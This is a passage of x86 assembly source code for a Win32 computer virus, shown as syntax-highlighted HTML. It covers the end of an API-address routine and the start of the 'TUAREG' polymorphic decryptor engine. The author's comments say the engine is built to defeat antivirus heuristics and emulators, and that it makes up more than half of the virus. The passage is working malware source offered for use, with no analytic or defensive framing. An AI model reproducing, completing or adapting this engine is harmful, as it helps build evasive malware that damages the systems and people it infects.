                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">rol</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@LoopAPI</span><span class="sc0">
       </span><span class="sc5">@@NameCalculated</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">APIInfo</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">
         </span><span class="sc5">@@LoopCheckAPI</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@APIFound</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">  </span><span class="sc5">@@LoopCheckAPI</span><span class="sc0">
    </span><span class="sc5">@@NextFunc</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Otro</span><span class="sc0">
    </span><span class="sc5">@@APIFound</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">AnyAPIFound</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@NextFunc</span><span class="sc0">
    </span><span class="sc5">@@Next2</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc5">@@Next</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">14h</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@Loop02</span><span class="sc0">
       </span><span class="sc5">@@Exit</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">popad</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">CalculateAPIsAddresses</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">Idata_Phys</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Idata_Virt</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">;ÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀ;</span><span class="sc0">
</span><span class="sc1">;––––––––––––––––––––––––––––––––––––––––––––––––––––––––––––––––––––––––––––;</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc1">;ﬂﬂﬂﬂ€ﬂﬂ  € €ﬂﬂ€ €ﬂ€‹ €ﬂﬂﬂ €ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ€     ‹€    ‹ﬂ‹  ‹€ ;</span><span class="sc0">
</span><span class="sc1">;ﬂﬂ€ € €  € €  € € ‹€ €    €    Tameless   Unpredictable €    ﬁﬂﬁ    › ﬁ ﬁﬂﬁ ;</span><span class="sc0">
</span><span class="sc1">;  € € €  € €ﬂﬂ€ €ﬂ€‹ €ﬂﬂ  € ﬂ€ Anarchic   Relentless    €      ﬁ   ﬁ ˛ ›  ﬁ ;</span><span class="sc0">
</span><span class="sc1">;  € € €‹‹€ €  € €  € €‹‹‹ €‹‹€ Encryption Generator     €‹‹‹‹‹ ﬁ ‹‹ › ﬁ ‹ ﬁ ;</span><span class="sc0">
</span><span class="sc1">;  €‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹ ‹€‹ ‹ ﬂ‹ﬂ ‹‹€‹;</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc1">; The name is quite strambotic :), but I had to justify why the engine is    ;</span><span class="sc0">
</span><span class="sc1">; called "TUAREG". Anyway, the name isn't new, as I'm in this project since  ;</span><span class="sc0">
</span><span class="sc1">; 1998, yet before making the MeDriPolEn.                                    ;</span><span class="sc0">
</span><span class="sc1">;                                                                            ;</span><span class="sc0">
</span><span class="sc1">; This engine features:                                                      ;</span><span class="sc0">
</span><span class="sc1">;                                                                            ;</span><span class="sc0">
</span><span class="sc1">; PRIDE - Pseudo-Random Index DEcryption                                     ;</span><span class="sc0">
</span><span class="sc1">; Branching Technique - Avoids linear execution of the decryption loop       ;</span><span class="sc0">
</span><span class="sc1">;                                                                            ;</span><span class="sc0">
</span><span class="sc1">; This two techniques are explained on the article about "Advanced decryption;</span><span class="sc0">
</span><span class="sc1">; construction" on 29A#5, where they are better explained than they would be ;</span><span class="sc0">
</span><span class="sc1">; here.                                                                      ;</span><span class="sc0">
</span><span class="sc1">;                                                                            ;</span><span class="sc0">
</span><span class="sc1">; Some notes:                                                                ;</span><span class="sc0">
</span><span class="sc1">; - The subroutines code will be at the end of every branch for every subrou-;</span><span class="sc0">
</span><span class="sc1">;  tine created in that branch (the engine selects randomly whether call a   ;</span><span class="sc0">
</span><span class="sc1">;  created existing one or create a new one and call it when inserting code).;</span><span class="sc0">
</span><span class="sc1">; - The registers have a "touched" flag, which avoids their use before set-  ;</span><span class="sc0">
</span><span class="sc1">;  ting on them a valid value (thing that sets lots of flags on heuristic    ;</span><span class="sc0">
</span><span class="sc1">;  scanners). So, when you call SelectARegisterWithInit, it'll look if the   ;</span><span class="sc0">
</span><span class="sc1">;  register is "touched". If it isn't, before returning it'll made a DoMOV   ;</span><span class="sc0">
</span><span class="sc1">;  with a random value and it'll set as "touched".                           ;</span><span class="sc0">
</span><span class="sc1">; - This version is 1.0 after adding calls to the Win32 API (concretely to   ;</span><span class="sc0">
</span><span class="sc1">;  KERNEL32) but not directly, but to the import table (like a normal app.). ;</span><span class="sc0">
</span><span class="sc1">; - "Recursivity" is the main word in the making of this engine. Almost      ;</span><span class="sc0">
</span><span class="sc1">;  every routine is prepared to be called in recursive instances, and with   ;</span><span class="sc0">
</span><span class="sc1">;  recursivity we make that the generated code become complex as hell. Just  ;</span><span class="sc0">
</span><span class="sc1">;  look at the code :).                                                      ;</span><span class="sc0">
</span><span class="sc1">; - The engine is HUGE (more than a half of the virus is this engine), and,  ;</span><span class="sc0">
</span><span class="sc1">;  corresponding to its size, the decryptor it generates is one of the most  ;</span><span class="sc0">
</span><span class="sc1">;  complex decryptors ever generated by any existent polymorphic engine. I'm ;</span><span class="sc0">
</span><span class="sc1">;  not saying it's the best, but sure it's one of the best :).               ;</span><span class="sc0">
</span><span class="sc1">; - Nothing more, enjoy it as much as I did it coding it!                    ;</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">; EAX=Displacement from the beginning till the virus</span><span class="sc0">
</span><span class="sc1">; EBX=Virtual address of the beginning of the encrypted part</span><span class="sc0">
</span><span class="sc1">; ECX=Place where the decryptors must be put</span><span class="sc0">
</span><span class="sc1">; Size of encrypted part is Virus_Size+Host_Data_Size</span><span class="sc0">

</span><span class="sc5">Ident_Tuareg</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc12">'[TUAREG v1.01]'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">  </span><span class="sc1">; This marks the beginning of</span><span class="sc0">
                                              </span><span class="sc1">; the engine</span><span class="sc0">
</span><span class="sc1">; Help with stack positions (when you do PUSHAD)</span><span class="sc0">
</span><span class="sc5">S_EAX</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">1Ch</span><span class="sc0">
</span><span class="sc5">S_ECX</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">18h</span><span class="sc0">
</span><span class="sc5">S_EDX</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">14h</span><span class="sc0">
</span><span class="sc5">S_EBX</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">10h</span><span class="sc0">
</span><span class="sc5">S_ESP</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0Ch</span><span class="sc0">
</span><span class="sc5">S_EBP</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">08h</span><span class="sc0">
</span><span class="sc5">S_ESI</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">04h</span><span class="sc0">
</span><span class="sc5">S_EDI</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00h</span><span class="sc0">

</span><span class="sc5">BssSection</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">   </span><span class="sc1">; Data-writing sections. Here we can define</span><span class="sc0">
</span><span class="sc5">Data1Section</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">   </span><span class="sc1">; memory variables and all that. The idea is very</span><span class="sc0">
</span><span class="sc5">Data2Section</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">   </span><span class="sc1">; similar to the MeDriPolEn, where I did a table</span><span class="sc0">
</span><span class="sc5">Data3Section</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">   </span><span class="sc1">; with all the free holes in the virus. This time</span><span class="sc0">
</span><span class="sc5">Data4Section</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">   </span><span class="sc1">; I include the .bss section, if it's available.</span><span class="sc0">
                         </span><span class="sc1">; Instead of making a table with writable addresses,</span><span class="sc0">
                         </span><span class="sc1">; I put here free frames of 256 bytes at least, gi-</span><span class="sc0">
                         </span><span class="sc1">; ving a random dword ptr address inside this frames.</span><span class="sc0">

</span><span class="sc5">ReservedBssAddress</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">   </span><span class="sc2">0</span><span class="sc0">  </span><span class="sc1">; I save this address to avoid making garbage with</span><span class="sc0">
                           </span><span class="sc1">; it. This address will be used to make a jump to</span><span class="sc0">
                           </span><span class="sc1">; the unencrypted part. Since the jump isn't cons-</span><span class="sc0">
                           </span><span class="sc1">; tructed before total decryption, the emulator of</span><span class="sc0">
                           </span><span class="sc1">; an antivirus must emulate to reach one of this</span><span class="sc0">
                           </span><span class="sc1">; jumps, to see where the decryptor jumps once the</span><span class="sc0">
                           </span><span class="sc1">; data is decrypted.</span><span class="sc0">

</span><span class="sc5">ReservedMemVars_F</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">30h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">ReservedMemVars_Addr</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">30h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">


</span><span class="sc5">DecryptorBeginAddress</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">  </span><span class="sc1">; Physical address of the decryptor</span><span class="sc0">
</span><span class="sc5">DecryptorVirtualBeginAddress</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">  </span><span class="sc1">; Virtual address of the decryptor</span><span class="sc0">
</span><span class="sc5">Distance</span><span class="sc0">                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">  </span><span class="sc1">; Distance from the virtual begin address</span><span class="sc0">
                                   </span><span class="sc1">; of the decryptor to the decrypted data</span><span class="sc0">
</span><span class="sc5">EncryptedDataBeginAddress</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">  </span><span class="sc1">; Place where the virtual address of the</span><span class="sc0">
                                   </span><span class="sc1">; encrypted virus is stored</span><span class="sc0">
</span><span class="sc5">Index1Register</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">     </span><span class="sc1">; Index1 Register</span><span class="sc0">
</span><span class="sc5">Index2Register</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">     </span><span class="sc1">; Index2 Register (used for PRIDE)</span><span class="sc0">
</span><span class="sc5">KeyRegister</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">     </span><span class="sc1">; Key register (it can be used or not)</span><span class="sc0">
</span><span class="sc5">BufferRegister</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">     </span><span class="sc1">; Buffer register, for some operations that</span><span class="sc0">
                              </span><span class="sc1">; require a not-modifiable-by-garbage register</span><span class="sc0">
</span><span class="sc5">CopyOfUsedRegisters</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc1">; Here we save the four registers</span><span class="sc0">
                                 </span><span class="sc1">; selected before sometimes, mainly when we</span><span class="sc0">
                                 </span><span class="sc1">; construct the jump to the decrypted part</span><span class="sc0">
                                 </span><span class="sc1">; and we don't need the register saving any-</span><span class="sc0">
                                 </span><span class="sc1">; more. Since we are coding the end of a</span><span class="sc0">
                                 </span><span class="sc1">; branch, we have to save them for the coding</span><span class="sc0">
                                 </span><span class="sc1">; of the next branches.</span><span class="sc0">
</span><span class="sc5">Index1Modifier</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">   </span><span class="sc1">; This is a random 8-multiple number between 0 and</span><span class="sc0">
                            </span><span class="sc1">; Virus_SizePOW2 (look PRIDE formula)</span><span class="sc0">
</span><span class="sc5">Index2Modifier</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">   </span><span class="sc1">; Value between 4 and 7. Since we are going to do</span><span class="sc0">
                            </span><span class="sc1">; AND Index2,xxx, being 0 the two last bits of</span><span class="sc0">
                            </span><span class="sc1">; xxx, we don't mind the two last bits of the mo-</span><span class="sc0">
                            </span><span class="sc1">; difier, since they are going to be anulated.</span><span class="sc0">

</span><span class="sc5">TuaregFlags</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">BranchIdentifier</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">AddressOfTuaregStackFrame</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">EPAddition</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">;; This flags are individual for each branch, so they aren't general. This</span><span class="sc0">
</span><span class="sc1">;; allows each branch to have a "unique" behaviour sometimes.</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;; Flags:</span><span class="sc0">
</span><span class="sc1">;; Bit 0: Use key register: 0=YES, 1=NO</span><span class="sc0">
</span><span class="sc1">;; Bit 1-2: 00=Use buffer register, 01=XOR again Index2, 10=PUSH/POP Index2</span><span class="sc0">
</span><span class="sc1">;;          11=Reserved, repeat flag obtention</span><span class="sc0">
</span><span class="sc1">;; Bit 3: 0=No action, 1=Exchange Index1 and Index2 when using one of them</span><span class="sc0">
</span><span class="sc1">;;       as memory index (avoid one possible algorithmical clue for detection)</span><span class="sc0">
</span><span class="sc1">;; Bit 4-5: 00=Functional branch code in a subroutine</span><span class="sc0">
</span><span class="sc1">;; Bit 6-7: 00=Index calculation + decryption in a subroutine</span><span class="sc0">
</span><span class="sc1">;; Bit 8-9: 00=Decryption in a subroutine</span><span class="sc0">
</span><span class="sc1">;; Bit 10-11: 00=All index modifications in a subroutine</span><span class="sc0">
</span><span class="sc1">;; Bit 12-13: 00=Modify index1 in a subroutine</span><span class="sc0">
</span><span class="sc1">;; Bit 14-15: 00=Mask index1 in a subroutine</span><span class="sc0">
</span><span class="sc1">;; Bit 16-17: 00=Modify index2 in a subroutine</span><span class="sc0">
</span><span class="sc1">;; Bit 18-19: 00=Mask index2 in a subroutine</span><span class="sc0">
</span><span class="sc1">;; Bit 20-31: Reserved for future expansion</span><span class="sc0">

</span><span class="sc1">;; Information for every branch in the reserved frame of stack:</span><span class="sc0">
</span><span class="sc1">;; +00: DWORD: Branch flags</span><span class="sc0">
</span><span class="sc1">;; +04: DWORD: Functional branch code subroutine address (0 if not made)</span><span class="sc0">
</span><span class="sc1">;; +08: DWORD: Index calculation + decryption subroutine address</span><span class="sc0">
</span><span class="sc1">;; +0C: DWORD: Decryption subroutine address</span><span class="sc0">
</span><span class="sc1">;; +10: DWORD: Index modifications subroutine address</span><span class="sc0">
</span><span class="sc1">;; +14: DWORD: Modification of index1 subroutine address</span><span class="sc0">
</span><span class="sc1">;; +18: DWORD: Masking of index1 subroutine address</span><span class="sc0">
</span><span class="sc1">;; +1C: DWORD: Modification of index2 subroutine address</span><span class="sc0">
</span><span class="sc1">;; +20: DWORD: Masking of index2 subroutine address</span><span class="sc0">
</span><span class="sc1">;; +24-40: reserved</span><span class="sc0">

</span><span class="sc5">InitialValue</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">  </span><span class="sc1">; This is the initial value of Index2. The decryp-</span><span class="sc0">
                           </span><span class="sc1">; tion of the virus body ends when Index2 reaches</span><span class="sc0">
                           </span><span class="sc1">; this value again.</span><span class="sc0">
</span><span class="sc1">;; Begin fun!</span><span class="sc0">
</span><span class="sc5">Tuareg</span><span class="sc0">          </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">pushad</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1000h</span><span class="sc0">   </span><span class="sc1">; Create stack frame for variables</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">AddressOfTuaregStackFrame</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Distance</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">DecryptorBeginAddress</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">DecryptorVirtualBeginAddress</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">  </span><span class="sc1">; Save entry values and put EDI as the sto-</span><span class="sc0">
                                  </span><span class="sc1">; rage address (to use STOSB and all that)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RelocHeader</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MappingAddress</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">PEHeaderAddress</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">34h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">EncryptedDataBeginAddress</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; Set the virtual</span><span class="sc0">
                                               </span><span class="sc1">; address of the encrypted data</span><span class="sc0">

        </span><span class="sc1">; This variables must be set to 0 at the beginning</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">JumpsToCompleteNdx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">JumpingArrayNdx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CallsLevel1Ndx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CallsLevel2Ndx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CallsLevel3Ndx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ArrayOfCalls1Ndx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ArrayOfCalls2Ndx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ArrayOfCalls3Ndx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TouchedRegisters</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TouchedRegisters</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ImInRandomLoop</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MOVingRecursLevel</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">KeyIsInit</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ImInAPI</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FirstAPICall</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
